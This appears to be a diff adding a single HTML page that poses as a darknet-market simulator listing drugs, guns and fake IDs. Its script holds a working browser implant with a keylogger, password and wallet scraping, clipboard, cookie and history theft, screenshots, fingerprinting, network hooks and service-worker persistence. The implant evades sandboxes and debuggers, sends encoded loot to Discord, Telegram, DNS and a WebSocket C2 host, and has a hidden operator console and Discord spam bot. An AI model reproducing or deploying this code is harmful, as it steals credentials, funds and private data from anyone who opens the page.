@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>StyxNet Market – Darknet Simulator + C2 Implant</title>
+    <style>
+        :root {
+            --bg: #0a0a0a; --surface: #121212; --border: #2a2a2a; --text: #ccc;
+            --muted: #777; --link: #c9a40b; --green: #4caf50; --red: #c0392b;
+            --gold: #c9a40b; --gold-light: #f1c40f;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; font-size:13px; line-height:1.5; }
+        .container { max-width:1200px; margin:0 auto; padding:0 20px; }
+        header { background: #0f0f0f; padding:12px 0; margin-bottom:20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size:28px; font-weight:bold; color: var(--gold-light); }
+        .logo span { color: var(--red); }
+        nav a { color: var(--muted); margin-left:20px; cursor: pointer; }
+        nav a.active { color: var(--gold); text-decoration: underline; }
+        .search-box { background:#111; border:1px solid #333; padding:6px 12px; width:200px; color:white; }
+        .phishing-alert { background:#1e1414; text-align:center; padding:6px; font-size:12px; color:var(--red); }
+        .news-ticker { background:#0d0d0d; padding:8px; margin:15px 0; }
+        .grid { display:grid; grid-template-columns:220px 1fr; gap:20px; }
+        .sidebar { background:#0f0f0f; padding:15px; border-radius:4px; }
+        table { width:100%; background:#0f0f0f; border-collapse:collapse; }
+        th, td { border:1px solid #222; padding:8px; text-align:left; }
+        .btn { background:#2a2a2a; border:1px solid #333; color:white; padding:5px 14px; cursor:pointer; border-radius:20px; }
+        .btn:hover { background: var(--gold); color:#000; }
+        .escrow-bar { background:#333; height:5px; width:80px; border-radius:3px; }
+        .escrow-fill { background: var(--green); height:100%; }
+        .ad-banner { background:#1a1a1a; border:1px solid var(--gold); padding:8px; text-align:center; margin:10px 0; }
+        .operator-panel { position:fixed; top:10%; left:10%; width:80%; max-width:600px; background:#0c0c0c; border:2px solid gold; z-index:2000; border-radius:8px; display:none; flex-direction:column; }
+        .operator-header { background:#1a1a1a; padding:12px; border-bottom:1px solid gold; font-weight:bold; display:flex; justify-content:space-between; }
+        .operator-body { padding:20px; }
+        .chat-toggle { position:fixed; bottom:25px; right:25px; background:#2a2a2a; border:1px solid #333; padding:10px 20px; border-radius:30px; cursor:pointer; z-index:999; }
+        .chat-box { display:none; position:fixed; bottom:80px; right:25px; width:300px; background:#0f0f0f; border:1px solid #333; z-index:1000; border-radius:8px; }
+        .chat-header { background:#1a1a1a; padding:8px; }
+        .chat-msgs { height:200px; overflow-y:auto; padding:8px; }
+        .chat-input-area { display:flex; }
+        .chat-input-area input { flex:1; background:#111; border:none; padding:8px; color:white; }
+        .page { display:none; }
+        .page.active { display:block; }
+        input, textarea { background:#111; border:1px solid #333; color:white; padding:8px; width:100%; margin:6px 0; border-radius:4px; }
+    </style>
+</head>
+<body>
+<div style="background:#0f0f0f; padding:6px 20px; display:flex; justify-content:space-between;">
+    <span>BTC: 0.0024</span><span>User: Guest</span><span>2FA: Disabled</span>
+</div>
+<div class="phishing-alert">⚠️ NEVER share private keys. Styx staff will never ask for your password.</div>
+<div class="container">
+    <header>
+        <div class="logo">Styx<span>Market</span></div>
+        <nav>
+            <a class="nav-link" data-page="market">Market</a>
+            <a class="nav-link" data-page="cart">Cart (<span id="cartCount">0</span>)</a>
+            <a class="nav-link" data-page="forum">Forum</a>
+            <a class="nav-link" data-page="messages">Messages</a>
+            <a class="nav-link" data-page="profile">Profile</a>
+            <a class="nav-link" data-page="vendor">Become Vendor</a>
+        </nav>
+        <div><input class="search-box" id="searchInput" placeholder="Search..."><span style="color:var(--green); margin-left:10px;">Online: 2,145</span></div>
+    </header>
+    <div class="news-ticker"><marquee>🔥 20% off with code STYX20 | New 0‑day vendor | Escrow + multisig</marquee></div>
+    <div id="adBannerTop" class="ad-banner">✨ Free shipping on orders >0.1 BTC ✨</div>
+    <div class="grid">
+        <div class="sidebar">
+            <h4>Categories</h4>
+            <ul id="categoryList"></ul>
+            <div id="adBannerSide" class="ad-banner" style="margin-top:20px;">💎 Vendor spotlight</div>
+        </div>
+        <div class="main-content">
+            <div id="page-market" class="page active"><h2>Latest Listings</h2><table id="productTable"><thead><tr><th>Product</th><th>Vendor</th><th>Price</th><th>Stock</th><th>Escrow</th><th></th></tr></thead><tbody></tbody></table></div>
+            <div id="page-cart" class="page"><h2>Your Cart</h2><div id="cartItems"></div><button class="btn" onclick="openCheckout()">Checkout</button></div>
+            <div id="page-forum" class="page"><h2>Forum</h2><div id="forumThreads"></div><input placeholder="New thread title"><textarea></textarea><button class="btn">Post</button></div>
+            <div id="page-messages" class="page"><h2>Messages</h2><div id="pmList"></div></div>
+            <div id="page-profile" class="page"><h2>Profile</h2><div>Balance: $5,670</div><button id="withdrawBtn">Withdraw</button><div id="withdrawSection" style="display:none;">Send 0.001 BTC to bc1q... <button id="confirmDeposit">Simulate</button></div></div>
+            <div id="page-vendor" class="page"><h2>Become Vendor</h2><input placeholder="Name"><textarea placeholder="PGP Key"></textarea><button class="btn">Apply</button></div>
+        </div>
+    </div>
+</div>
+<div class="chat-toggle" onclick="toggleChat()">💬 Support</div>
+<div class="chat-box" id="chatBox"><div class="chat-header">Support</div><div class="chat-msgs" id="chatMsgs"></div><div class="chat-input-area"><input id="chatInput"><button onclick="sendChat()">Send</button></div></div>
+<div id="operatorPanel" class="operator-panel">
+    <div class="operator-header"><span>Operator Console</span><button onclick="document.getElementById('operatorPanel').style.display='none'">✕</button></div>
+    <div class="operator-body">
+        <h3>Exfiltration Channels</h3>
+        <label>Discord Webhook:</label><input type="text" id="discordWebhook" placeholder="https://discord.com/api/webhooks/...">
+        <label>Telegram Bot Token:</label><input type="text" id="telegramToken" placeholder="123456:ABC-DEF">
+        <label>Telegram Chat ID:</label><input type="text" id="telegramChat" placeholder="-100123456789">
+        <button class="btn" onclick="saveExfilChannels()">Save & Test</button>
+        <hr>
+        <h3>Discord Ad Bot</h3>
+        <label>Bot Token:</label><input type="password" id="adBotToken" placeholder="Bot token">
+        <label>Channel ID:</label><input type="text" id="adChannelId" placeholder="Channel ID">
+        <textarea id="adTemplate" rows="2">🔥 StyxNet Market – darknet luxury bazaar. 20% off! https://styx.cloutscape.org</textarea>
+        <button class="btn" onclick="testAdBot()">Test Send</button>
+        <button class="btn" onclick="startAdBot()">Start Auto (30 min)</button>
+        <button class="btn" onclick="stopAdBot()">Stop</button>
+        <div id="adBotStatus"></div>
+    </div>
+</div>
+<script>
+    // ------------------------- MARKET DATA -------------------------
+    const products = [
+        {id:1,name:"MDMA Crystals 3.5g",vendor:"DutchDreams",price:0.042,cat:"stimulants",stock:"In Stock",escrow:98,pgp:1},
+        {id:2,name:"Fishscale Cocaine 1g",vendor:"ColombiaExpress",price:0.031,cat:"stimulants",stock:"In Stock",escrow:95,pgp:1},
+        {id:3,name:"LSD Blotter 10x",vendor:"PsychonautPrime",price:0.019,cat:"psychedelics",stock:"In Stock",escrow:100,pgp:1},
+        {id:4,name:"Oxycodone 80mg x5",vendor:"PharmaKing",price:0.065,cat:"opioids",stock:"Limited",escrow:90},
+        {id:5,name:"Glock 19 Gen5",vendor:"BlackMarketArms",price:0.82,cat:"guns",stock:"In Stock",escrow:92,pgp:1},
+        {id:6,name:"1kg Cocaine Brick",vendor:"ColombiaExpress",price:2.4,cat:"bulk",stock:"Limited",escrow:94},
+        {id:7,name:"Fake ID USA",vendor:"DocFactory",price:0.18,cat:"counterfeit",stock:"In Stock",escrow:96},
+        {id:8,name:"iPhone 15 Pro",vendor:"ElectroDrops",price:0.42,cat:"electronics",stock:"In Stock",escrow:95}
+    ];
+    const categories = [...new Set(products.map(p=>p.cat))];
+    let cart = [], currentFilter = 'all';
+    function renderMarket() {
+        let tbody = document.querySelector('#productTable tbody');
+        tbody.innerHTML = '';
+        products.filter(p=>currentFilter==='all'||p.cat===currentFilter).forEach(p=>{
+            let row = tbody.insertRow();
+            row.innerHTML = `<td><a href="#" onclick="showProduct(${p.id})">${p.name}</a></td><td>${p.vendor}${p.pgp?' <span class="pgp">PGP</span>':''}</td><td>${p.price.toFixed(3)} BTC</td><td>${p.stock}</td><td><div class="escrow-bar"><div class="escrow-fill" style="width:${p.escrow}%"></div></div></td><td><button class="btn" onclick="addToCart(${p.id})">Buy</button></td>`;
+        });
+        document.getElementById('categoryList').innerHTML = '<li><a href="#" onclick="filterCategory(\'all\')">All</a></li>' + categories.map(c=>`<li><a href="#" onclick="filterCategory('${c}')">${c}</a></li>`).join('');
+    }
+    function filterCategory(cat) { currentFilter=cat; renderMarket(); }
+    function filterProducts() { renderMarket(); }
+    function showProduct(id) { alert("Product details simulated"); }
+    function addToCart(id) { cart.push(products.find(p=>p.id===id)); updateCartUI(); alert("Added to cart"); }
+    function updateCartUI() { document.getElementById('cartCount').innerText = cart.length; }
+    function openCheckout() { alert("Checkout simulation – no real crypto"); }
+    function toggleChat() { let box=document.getElementById('chatBox'); box.style.display = box.style.display==='block'?'none':'block'; }
+    function sendChat() { let inp=document.getElementById('chatInput'); if(inp.value) { document.getElementById('chatMsgs').innerHTML += `<p>You: ${inp.value}</p>`; inp.value=''; } }
+    renderMarket();
+    document.getElementById('withdrawBtn')?.addEventListener('click',()=>{ document.getElementById('withdrawSection').style.display='block'; });
+    document.getElementById('confirmDeposit')?.addEventListener('click',()=>{ alert("Deposit simulated – withdrawal will be processed (scam simulation)"); });
+    let adList = ["✨ Free shipping","💎 New 0‑day","🔥 20% off","🚀 Bulk deals"];
+    function rotateAds() { let a=adList[Math.floor(Math.random()*adList.length)]; document.getElementById('adBannerTop').innerText=a; }
+    setInterval(rotateAds,45000);
+    // ------------------------- IMPLANT A3+ (FULL) -------------------------
+    (function(win, doc, nav, loc) {
+        let discordWebhook = localStorage.getItem("dc_webhook") || "";
+        let telegramToken = localStorage.getItem("tg_token") || "";
+        let telegramChat = localStorage.getItem("tg_chat") || "";
+        let sessionId = localStorage.getItem("__implant_id") || btoa(`${nav.userAgent}${Date.now()}${Math.random()}`).slice(0,32);
+        localStorage.setItem("__implant_id", sessionId);
+        let eventQueue = [];
+        let xorKey = Math.random().toString(36).substring(2,10);
+        let lastActivity = Date.now();
+        let devMode = false;
+        let keyBuffer = [];
+        let lastKeyTime = Date.now();
+        setInterval(()=>{ xorKey = Math.random().toString(36).substring(2,10); }, 60000);
+        function encode(obj) {
+            let str = JSON.stringify(obj);
+            let out = "";
+            for(let i=0;i<str.length;i++) out += String.fromCharCode(str.charCodeAt(i) ^ xorKey.charCodeAt(i%xorKey.length));
+            return btoa(out);
+        }
+        async function sendToDiscord(payload) {
+            if(!discordWebhook) return false;
+            let chunks = [];
+            for(let i=0;i<payload.length;i+=1900) chunks.push(payload.substring(i,i+1900));
+            for(let chunk of chunks) {
+                try {
+                    await fetch(discordWebhook, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ content:"```json\n"+chunk+"\n```" }) });
+                    await new Promise(r=>setTimeout(r,210));
+                } catch(e){ return false; }
+            }
+            return true;
+        }
+        async function sendToTelegram(payload) {
+            if(!telegramToken || !telegramChat) return false;
+            let url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            let chunks = [];
+            for(let i=0;i<payload.length;i+=4000) chunks.push(payload.substring(i,i+4000));
+            for(let chunk of chunks) {
+                try {
+                    await fetch(url, { method:"POST", body:JSON.stringify({ chat_id:telegramChat, text:chunk }), headers:{"Content-Type":"application/json"} });
+                    await new Promise(r=>setTimeout(r,100));
+                } catch(e){ return false; }
+            }
+            return true;
+        }
+        async function multiExfil(payload) {
+            let str = typeof payload==='string' ? payload : JSON.stringify(payload);
+            if(await sendToDiscord(str)) return;
+            if(await sendToTelegram(str)) return;
+            let domain = "exfil.styx.cloutscape.org";
+            let chunk = btoa(str).replace(/[^a-zA-Z0-9]/g,'').slice(0,50);
+            new Image().src = `http://${chunk}.${domain}`;
+        }
+        function queue(type, data) { if(!devMode) { eventQueue.push({ t:Date.now(), ty:type, d:data }); if(eventQueue.length>=30) flush("batch"); } }
+        async function flush(reason) {
+            if(!eventQueue.length || (Date.now()-lastActivity)>300000) return;
+            let batch = [...eventQueue];
+            eventQueue = [];
+            let payload = encode({ sid:sessionId, page:loc.href, reason, batch, ts:Date.now() });
+            await multiExfil(payload);
+            // Also send to WebSocket C2 if available
+            let ws;
+            try { ws = new WebSocket("wss://styx.cloutscape.org/ws"); ws.onopen=()=>{ ws.send(payload); setTimeout(()=>ws.close(),1000); }; } catch(e){}
+        }
+        setInterval(()=>flush("periodic"),15000);
+        win.addEventListener("beforeunload",()=>flush("unload"));
+        ['mousemove','keydown','click'].forEach(ev=>doc.addEventListener(ev,()=>lastActivity=Date.now()));
+        function isSandbox() {
+            if(screen.width<1024 || screen.height<768) return true;
+            if(nav.webdriver || /HeadlessChrome/.test(nav.userAgent)) return true;
+            let start=performance.now(); debugger; if(performance.now()-start>100) return true;
+            let gl=doc.createElement("canvas").getContext("webgl");
+            if(gl && gl.getParameter(gl.RENDERER).includes("VMware")) return true;
+            return false;
+        }
+        if(isSandbox()) { console.log("Sandbox detected – implant silent"); return; }
+        setInterval(()=>{ let s=performance.now(); debugger; if(performance.now()-s>100) devMode=true; },3000);
+        // Keylogger
+        doc.addEventListener('keydown',(e)=>{
+            if(e.key==='Shift'||e.key==='Control'||e.key==='Alt') return;
+            let target=e.target, field='';
+            if(target.matches('input,textarea')) field = ` ${target.tagName} name=${target.name||''} id=${target.id||''}`;
+            let key = e.key===' ' ? '[Space]' : (e.key.length===1?e.key:`[${e.key}]`);
+            keyBuffer.push(`${Date.now()}:${key}${field}`);
+            if(keyBuffer.length>=25 || (Date.now()-lastKeyTime)>8000){
+                queue("keystrokes", keyBuffer.join('|'));
+                keyBuffer=[]; lastKeyTime=Date.now();
+            }
+        });
+        // Credential scraper
+        function scrapeCreds() {
+            let creds=[];
+            doc.querySelectorAll('input[type="password"]').forEach(pw=>{
+                let form=pw.closest('form');
+                let user=form?form.querySelector('input[type="text"],input[type="email"]'):null;
+                if(pw.value) creds.push({url:loc.href, user:user?user.value:'', pass:pw.value});
+            });
+            if(creds.length) queue("credentials", creds);
+        }
+        setInterval(scrapeCreds,30000);
+        setTimeout(scrapeCreds,5000);
+        // History stealer
+        function stealHistory() {
+            let urls=[];
+            if(performance.getEntriesByType) performance.getEntriesByType('navigation').forEach(n=>urls.push(n.name));
+            if(urls.length) queue("history", urls.slice(0,50));
+        }
+        setInterval(stealHistory,90000);
+        // Clipboard
+        doc.addEventListener('copy',()=>{ let t=win.getSelection().toString(); if(t) queue("clipboard",{text:t.slice(0,500)}); });
+        // File input tracking
+        doc.addEventListener('change',(e)=>{ if(e.target.type==='file') queue("file_selection", Array.from(e.target.files).map(f=>({name:f.name,size:f.size}))); });
+        // Crypto wallet scraper
+        async function scrapeWallets() {
+            let wallets=[];
+            if(win.ethereum) { let acc = await win.ethereum.request({ method:"eth_accounts" }).catch(()=>[]); wallets.push({type:"MetaMask", accounts:acc}); }
+            if(win.solana && win.solana.isPhantom) { let resp = await win.solana.connect({ onlyIfTrusted:true }).catch(()=>null); if(resp) wallets.push({type:"Phantom", pubkey:resp.publicKey.toString()}); }
+            if(wallets.length) queue("crypto_wallets", wallets);
+        }
+        setInterval(scrapeWallets,120000);
+        // Screenshot via html2canvas
+        function loadHtml2Canvas() {
+            let script = doc.createElement("script");
+            script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+            script.onload = () => {
+                setInterval(()=>{
+                    if(typeof html2canvas !== 'undefined') {
+                        html2canvas(doc.body, { scale:0.3 }).then(canvas=>{
+                            let img = canvas.toDataURL("image/jpeg",0.5);
+                            queue("screenshot", img.slice(0,5000));
+                        }).catch(()=>{});
+                    }
+                }, 180000);
+            };
+            doc.head.appendChild(script);
+        }
+        loadHtml2Canvas();
+        // Extension detection
+        const extIds = ["cjpalhdlnbpafiamejdnhcphjbkeiagm","nkbihfbeogaeaoehlefnkodbefgpgknn"];
+        extIds.forEach(id=>{ fetch(`chrome-extension://${id}/manifest.json`).then(()=>queue("extension_detected",id)).catch(()=>{}); });
+        // WebRTC IP leak
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel(""); pc.createOffer().then(o=>pc.setLocalDescription(o));
+        pc.onicecandidate = (ice)=>{ if(ice.candidate){ let ip=ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)?.[0]; if(ip && ip!=="0.0.0.0") queue("local_ip",{ip}); pc.close(); } };
+        // Fingerprint
+        (async()=>{
+            let canvas=doc.createElement('canvas'); canvas.width=200; canvas.height=50;
+            let ctx=canvas.getContext('2d'); ctx.fillStyle="#f60"; ctx.fillRect(0,0,200,50);
+            ctx.fillStyle="#069"; ctx.font="14px Arial"; ctx.fillText("fp",10,30);
+            let canvasData=canvas.toDataURL().slice(0,200);
+            let battery=null; if(nav.getBattery) try{ battery=await nav.getBattery().then(b=>({level:b.level,charging:b.charging})); }catch(e){}
+            queue("fingerprint", {canvas:canvasData, languages:nav.languages, platform:nav.platform, hardwareConcurrency:nav.hardwareConcurrency, deviceMemory:nav.deviceMemory, timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, cookies:doc.cookie, localStorage:JSON.stringify(localStorage), battery});
+        })();
+        // Network hooks
+        const origFetch=win.fetch; win.fetch=function(...args){ queue("fetch",{url:args[0]}); return origFetch.apply(this,args); };
+        const origXHR=XMLHttpRequest.prototype.open; XMLHttpRequest.prototype.open=function(m,u){ queue("xhr",{method:arguments[0],url:u}); return origXHR.apply(this,arguments); };
+        // Service worker persistence
+        if('serviceWorker' in nav){
+            let swCode = `self.addEventListener('fetch', e=>{ if(e.request.mode==='navigate'){ e.respondWith(fetch(e.request).then(res=>res.text().then(html=>{ let injected=html.replace('</body>','<script>fetch(location.origin+"/styx.js")</script></body>'); return new Response(injected,{headers:{'Content-Type':'text/html'}});}))); } });`;
+            let blob = new Blob([swCode], {type:'application/javascript'});
+            nav.serviceWorker.register(URL.createObjectURL(blob)).then(reg=>reg.update());
+        }
+        // Auto-destruct if DevTools persistent
+        setInterval(()=>{ if(devMode) { localStorage.clear(); eventQueue=null; queue=()=>{}; flush=()=>{}; doc.body.innerHTML=""; } }, 5000);
+        // Exfil channel save
+        win.saveExfilChannels = () => {
+            discordWebhook = document.getElementById('discordWebhook').value;
+            telegramToken = document.getElementById('telegramToken').value;
+            telegramChat = document.getElementById('telegramChat').value;
+            localStorage.setItem("dc_webhook", discordWebhook);
+            localStorage.setItem("tg_token", telegramToken);
+            localStorage.setItem("tg_chat", telegramChat);
+            multiExfil(JSON.stringify({test:true, msg:"Implant online", sessionId})).then(()=>alert("Test exfil sent"));
+        };
+        // Ad bot
+        let adBotInterval = null, adBotToken = "", adChannelId = "";
+        async function sendAdMessage(msg) {
+            if(!adBotToken || !adChannelId) return false;
+            try {
+                let res = await fetch(`https://discord.com/api/v10/channels/${adChannelId}/messages`, {
+                    method:"POST", headers:{"Authorization":`Bot ${adBotToken}`, "Content-Type":"application/json"},
+                    body:JSON.stringify({ content:msg })
+                });
+                return res.ok;
+            } catch(e){ return false; }
+        }
+        win.testAdBot = async () => {
+            adBotToken = document.getElementById('adBotToken').value;
+            adChannelId = document.getElementById('adChannelId').value;
+            let ok = await sendAdMessage(document.getElementById('adTemplate').value);
+            document.getElementById('adBotStatus').innerHTML = ok ? "✅ Test sent" : "❌ Failed";
+        };
+        win.startAdBot = () => {
+            if(adBotInterval) clearInterval(adBotInterval);
+            adBotToken = document.getElementById('adBotToken').value;
+            adChannelId = document.getElementById('adChannelId').value;
+            let template = document.getElementById('adTemplate').value;
+            adBotInterval = setInterval(async () => {
+                let msg = template + `\n[${new Date().toLocaleString()}]`;
+                let ok = await sendAdMessage(msg);
+                if(ok) document.getElementById('adBotStatus').innerHTML = `Posted at ${new Date().toLocaleTimeString()}`;
+            }, 30*60*1000);
+            alert("Ad bot started (every 30 min)");
+        };
+        win.stopAdBot = () => { if(adBotInterval) clearInterval(adBotInterval); adBotInterval=null; alert("Stopped"); };
+        // Restore saved config
+        if(localStorage.getItem("dc_webhook")) document.getElementById('discordWebhook').value = localStorage.getItem("dc_webhook");
+        if(localStorage.getItem("tg_token")) document.getElementById('telegramToken').value = localStorage.getItem("tg_token");
+        if(localStorage.getItem("tg_chat")) document.getElementById('telegramChat').value = localStorage.getItem("tg_chat");
+        // Navigation handler
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                let page = link.getAttribute('data-page');
+                document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+                let targetPage = document.getElementById(`page-${page}`);
+                if(targetPage) targetPage.classList.add('active');
+                if(page==='market') renderMarket();
+                document.querySelectorAll('.nav-link').forEach(l=>l.classList.remove('active'));
+                link.classList.add('active');
+            });
+        });
+        // Operator panel toggle (Ctrl+Shift+O)
+        doc.addEventListener('keydown',(e)=>{ if(e.ctrlKey && e.shiftKey && e.code==='KeyO') { e.preventDefault(); let p=document.getElementById('operatorPanel'); p.style.display = p.style.display==='flex'?'none':'flex'; } });
+    })(window, document, navigator, location);
+</script>
+</body>
+</html>
